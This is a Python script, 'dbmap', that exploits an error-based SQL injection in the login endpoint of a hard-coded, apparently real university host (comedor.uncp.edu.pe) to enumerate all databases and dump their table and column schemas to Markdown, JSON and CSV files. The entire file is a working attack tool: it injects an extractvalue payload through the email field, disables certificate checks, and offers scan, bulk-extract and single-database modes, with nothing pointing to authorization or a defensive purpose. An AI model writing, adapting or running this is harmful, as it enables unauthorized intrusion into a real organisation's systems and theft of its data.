#!/usr/bin/env python3
"""
dbmap - Database Schema Mapper via SQL Injection (error-based)
Modes: --scan (list DBs), --extract (bulk mapping), --db (single DB)
"""

import argparse
import sys
import os
import time
import json
import csv
import re
from datetime import datetime
from typing import Optional, List, Dict, Any

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- CONFIGURATION ------------------------------------------------------------
HOST_API = "comedor.uncp.edu.pe"
API_PATH = "/server"
TIMEOUT = 10
MAX_RETRIES = 3
DELAY = 0.3

# --- COLORS (ANSI) ------------------------------------------------------------
class Colors:
    GREEN = '\033[0;32m'
    BLUE = '\033[0;34m'
    RED = '\033[0;31m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[0;36m'
    NC = '\033[0m'

def log(msg: str) -> None:
    print(f"{Colors.BLUE}[*]{Colors.NC} {msg}")

def success(msg: str) -> None:
    print(f"{Colors.GREEN}[+]{Colors.NC} {msg}")

def error(msg: str) -> None:
    print(f"{Colors.RED}[!]{Colors.NC} {msg}", file=sys.stderr)

def warning(msg: str) -> None:
    print(f"{Colors.YELLOW}[!]{Colors.NC} {msg}")

# --- SQL INJECTION CLIENT -----------------------------------------------------
class SQLiClient:
    def __init__(self, host: str, path: str, timeout: int = TIMEOUT,
                 max_retries: int = MAX_RETRIES, delay: float = DELAY):
        self.url = f"https://{host}{path}/login.php"
        self.timeout = timeout
        self.max_retries = max_retries
        self.delay = delay
        self.session = self._create_session()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=self.delay,
            status_forcelist=[500, 502, 503, 504],
            allowed_methods=["POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        return session

    def execute(self, query: str) -> Optional[str]:
        """
        Execute an SQL query via error-based injection (extractvalue).
        Returns the extracted string or None on failure.
        """
        payload = f"' OR extractvalue(1, concat(0x7e, ({query}))) #"
        data = {"email": payload, "password": "any"}

        for attempt in range(self.max_retries):
            try:
                response = self.session.post(
                    self.url,
                    data={"data": json.dumps(data)},
                    headers={"Host": HOST_API},
                    timeout=self.timeout,
                    verify=False  # equivalent to curl -k
                )
                # Extract content between "XPATH syntax error: '~" and next "'"
                match = re.search(r"XPATH syntax error: '~([^']+)'", response.text)
                if match:
                    return match.group(1)
            except Exception as e:
                if attempt == self.max_retries - 1:
                    error(f"Injection request failed: {e}")
                time.sleep(self.delay)

        return None

# --- SCHEMA MAPPER ------------------------------------------------------------
class DBMap:
    def __init__(self, sqli: SQLiClient):
        self.sqli = sqli

    def map_single_db(self, db_target: str, base_output_dir: str) -> bool:
        """Map a single database and generate output files."""
        if not db_target or not base_output_dir:
            error("Usage: map_single_db <DB> <base_dir>")
            return False

        output_dir = os.path.join(base_output_dir, db_target)
        os.makedirs(output_dir, exist_ok=True)

        md_file = os.path.join(output_dir, f"modelo_{db_target}.md")
        json_file = os.path.join(output_dir, f"modelo_{db_target}.json")
        csv_file = os.path.join(output_dir, f"modelo_{db_target}.csv")

        log(f"Processing DB: {Colors.CYAN}{db_target}{Colors.NC} -> {output_dir}")

        # Write Markdown header
        with open(md_file, "w", encoding="utf-8") as f:
            f.write(f"# Database Schema - {db_target}\n\n")
            f.write(f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"**Host:** {HOST_API}\n")
            f.write(f"**Method:** Error-based (extractvalue)\n\n")
            f.write("## Tables\n\n")

        # JSON structure (will be built incrementally)
        json_data = {
            "database": db_target,
            "generated": datetime.now().isoformat(),
            "host": HOST_API,
            "method": "error-based",
            "tables": []
        }

        # CSV header
        with open(csv_file, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Database", "Table", "Column", "Type", "Nullable", "Key"])

        # Get table count
        count_result = self.sqli.execute(
            f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_target}'"
        )
        if not count_result:
            warning(f"No tables found in {db_target}")
            return True

        try:
            table_count = int(count_result)
        except ValueError:
            error(f"Invalid table count: {count_result}")
            return False

        for t in range(table_count):
            table_name = self.sqli.execute(
                f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='{db_target}' LIMIT {t},1"
            )
            if not table_name:
                continue
            # Sanitize table name (keep alphanumeric and underscore)
            table_name = re.sub(r'[^a-zA-Z0-9_]', '', table_name)

            print(f"\r{Colors.CYAN}[{db_target}] Progress: {t*100//table_count}%{Colors.NC} "
                  f"Table: {table_name} ({t+1}/{table_count})    ", end="", flush=True)

            # Get column count
            col_count_result = self.sqli.execute(
                f"SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_name='{table_name}' AND table_schema='{db_target}'"
            )
            col_count = int(col_count_result) if col_count_result else 0

            # Append table to JSON
            table_entry: Dict[str, Any] = {"name": table_name, "columns": []}
            json_data["tables"].append(table_entry)

            # Append table to Markdown
            with open(md_file, "a", encoding="utf-8") as f:
                f.write(f"## Table: `{table_name}`\n\n")
                f.write("| # | Column | Type | Nullable | Key |\n")
                f.write("|---|--------|------|----------|-----|\n")

            # Process columns
            for c in range(col_count):
                column = self.sqli.execute(
                    f"SELECT column_name FROM information_schema.columns "
                    f"WHERE table_name='{table_name}' AND table_schema='{db_target}' LIMIT {c},1"
                )
                if not column:
                    continue

                data_type = self.sqli.execute(
                    f"SELECT data_type FROM information_schema.columns "
                    f"WHERE table_name='{table_name}' AND table_schema='{db_target}' LIMIT {c},1"
                ) or "unknown"

                is_nullable = self.sqli.execute(
                    f"SELECT is_nullable FROM information_schema.columns "
                    f"WHERE table_name='{table_name}' AND table_schema='{db_target}' LIMIT {c},1"
                ) or "YES"

                column_key = self.sqli.execute(
                    f"SELECT column_key FROM information_schema.columns "
                    f"WHERE table_name='{table_name}' AND table_schema='{db_target}' LIMIT {c},1"
                ) or ""

                # Append to Markdown
                with open(md_file, "a", encoding="utf-8") as f:
                    f.write(f"| {c} | `{column}` | {data_type} | {is_nullable} | {column_key} |\n")

                # Append to JSON
                col_info = {"name": column}
                if data_type:
                    col_info["type"] = data_type
                if is_nullable:
                    col_info["nullable"] = is_nullable
                if column_key:
                    col_info["key"] = column_key
                table_entry["columns"].append(col_info)

                # Append to CSV
                with open(csv_file, "a", newline="", encoding="utf-8") as f:
                    writer = csv.writer(f)
                    writer.writerow([db_target, table_name, column, data_type, is_nullable, column_key])

            # Add extra newline in MD after table
            with open(md_file, "a", encoding="utf-8") as f:
                f.write("\n")

            time.sleep(DELAY)

        # Write final JSON
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)

        print()  # newline after progress
        success(f"DB {db_target} completed → {output_dir}")
        return True

    def scan_databases(self, output_file: Optional[str] = None) -> bool:
        """Scan all databases on the target."""
        log(f"Scanning all databases on {HOST_API} (error-based)...")

        total_result = self.sqli.execute("SELECT COUNT(*) FROM information_schema.schemata")
        if not total_result:
            error("Failed to get database count. Injection may not work.")
            return False

        try:
            total = int(total_result)
        except ValueError:
            error(f"Invalid database count: {total_result}")
            return False

        success(f"Total databases found: {total}")
        print()

        if output_file:
            if os.path.exists(output_file):
                warning(f"File '{output_file}' exists. Overwrite? (y/n)")
                respuesta = input().strip().lower()
                if respuesta != 'y':
                    error("Cancelled.")
                    return False
            # Clear or create file
            open(output_file, "w").close()
            log(f"Saving list to: {output_file}")

        databases = []
        for i in range(total):
            db = self.sqli.execute(
                f"SELECT schema_name FROM information_schema.schemata LIMIT {i},1"
            )
            if db:
                print(f"  {db}")
                databases.append(db)
                if output_file:
                    with open(output_file, "a") as f:
                        f.write(db + "\n")
            print(f"\r{Colors.CYAN}Progress: {i*100//total}%{Colors.NC}   ", end="", flush=True)

        print()
        success("Scan completed.")
        if output_file:
            log(f"List saved to {os.path.realpath(output_file)}")
        return True

    def extract_from_list(self, list_file: str) -> bool:
        """Bulk extraction from a file containing database names."""
        if not list_file:
            error("Usage: --extract <list_file.txt>")
            return False

        if not os.path.isfile(list_file):
            error(f"File '{list_file}' not found.")
            return False

        with open(list_file, "r") as f:
            dbs = [line.strip() for line in f if line.strip()]

        if not dbs:
            error(f"No valid database names in '{list_file}'.")
            return False

        log(f"Processing {len(dbs)} databases from '{list_file}'")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_output_dir = f"output_{timestamp}"
        os.makedirs(base_output_dir, exist_ok=True)
        log(f"Output root: {base_output_dir}")

        total_start = time.time()
        success_count = 0
        fail_count = 0

        for db in dbs:
            if self.map_single_db(db, base_output_dir):
                success_count += 1
            else:
                fail_count += 1

        total_elapsed = int(time.time() - total_start)
        print()
        success(f"Bulk extraction completed in {total_elapsed}s")
        log(f"Successful: {success_count} | Failed: {fail_count}")
        log(f"Results stored in: {base_output_dir}")
        return True

# --- COMMAND LINE INTERFACE ---------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="dbmap - Database Schema Mapper via SQL Injection",
        add_help=False
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--scan", action="store_true", help="List all databases on the target")
    group.add_argument("--extract", metavar="list_file", help="Map all databases listed in the file")
    group.add_argument("--db", metavar="db_name", help="Map a single database")
    parser.add_argument("-o", "--output", metavar="file", help="For --scan: save database list to file")
    parser.add_argument("-h", "--help", action="store_true", help="Show this help message and exit")

    args = parser.parse_args()

    if args.help:
        print(__doc__)
        print("\nOutput structure (for --extract or --db):")
        print("  output_YYYYMMDD_HHMMSS/")
        print("    └── <db_name>/")
        print("          ├── modelo_<db>.md")
        print("          ├── modelo_<db>.json")
        print("          └── modelo_<db>.csv")
        print("\nExamples:")
        print("  dbmap.py --scan -o all_dbs.txt")
        print("  dbmap.py --scan")
        print("  dbmap.py --extract all_dbs.txt")
        print("  dbmap.py --db db_tesis")
        print("  dbmap.py --help")
        sys.exit(0)

    # Disable SSL warnings (equivalent to curl -k)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sqli = SQLiClient(HOST_API, API_PATH)
    mapper = DBMap(sqli)

    if args.scan:
        # Clear screen for style (optional)
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                     DATABASE SCAN MODE                          ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.NC}")
        mapper.scan_databases(args.output)

    elif args.extract:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    BULK EXTRACTION MODE                         ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.NC}")
        mapper.extract_from_list(args.extract)

    elif args.db:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                   SINGLE DATABASE MODE                          ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.NC}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_output_dir = f"output_{timestamp}"
        os.makedirs(base_output_dir, exist_ok=True)
        log(f"Output directory: {base_output_dir}")
        mapper.map_single_db(args.db, base_output_dir)
        log(f"Results saved in: {base_output_dir}/{args.db}/")

if __name__ == "__main__":
    main()